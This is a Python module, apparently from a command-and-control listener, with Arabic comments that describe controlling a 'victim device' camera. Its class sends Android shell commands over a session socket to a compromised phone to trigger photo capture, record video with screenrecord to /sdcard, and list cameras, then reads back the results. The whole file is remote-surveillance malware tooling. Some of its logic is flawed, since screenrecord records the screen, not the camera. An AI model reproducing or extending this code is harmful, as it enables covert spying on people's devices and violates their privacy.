# 📁 c2_listener/commands/camera_capture.py
"""
التحكم بكاميرا الجهاز الضحية
"""

import time

class CameraCapture:
    def __init__(self, session_socket):
        self.socket = session_socket
    
    def capture_photo(self, camera_id: str = "0") -> dict:
        """التقاط صورة"""
        # هذا أمر متقدم ويتطلب تطبيق خاص على الجهاز الضحية
        command = f"am start -a android.media.action.IMAGE_CAPTURE"
        return self._send_command(command)
    
    def start_video(self, duration: int = 10) -> dict:
        """بدء تسجيل فيديو"""
        command = f"screenrecord --time-limit {duration} /sdcard/video.mp4"
        return self._send_command(command)
    
    def get_camera_list(self) -> dict:
        """الحصول على قائمة الكاميرات"""
        command = "dumpsys media.camera | grep 'Camera.*Id'"
        return self._send_command(command)
    
    def _send_command(self, command: str) -> dict:
        """إرسال أمر"""
        try:
            self.socket.send((command + "\n").encode())
            time.sleep(2)  # انتظار التنفيذ
            
            result = self._receive_data()
            
            return {
                "success": True if "success" in result.lower() else False,
                "result": result,
                "command": command
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _receive_data(self) -> str:
        """استقبال البيانات"""
        try:
            data = b""
            self.socket.settimeout(3)
            
            while True:
                chunk = self.socket.recv(1024)
                if not chunk:
                    break
                data += chunk
            
            return data.decode('utf-8', errors='ignore')
        except:
            return ""